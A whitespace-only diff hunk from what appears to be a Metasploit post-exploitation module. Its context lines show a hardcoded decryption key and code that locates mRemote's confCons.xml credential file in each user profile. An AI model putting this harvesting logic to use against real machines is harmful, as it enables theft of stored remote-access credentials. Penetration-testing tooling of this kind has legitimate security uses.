@@ -46,7 +46,7 @@ class Metasploit3 < Msf::Post
 
 	def run
 		@secret=  "\xc8\xa3\x9d\xe2\xa5\x47\x66\xa0\xda\x87\x5f\x79\xaa\xf1\xaa\x8c"
-		
+
 		grab_user_profiles().each do |user|
 			next if user['LocalAppData'] == nil
 			tmpath= user['LocalAppData'] + '\\Felix_Deimel\\mRemote\\confCons.xml'
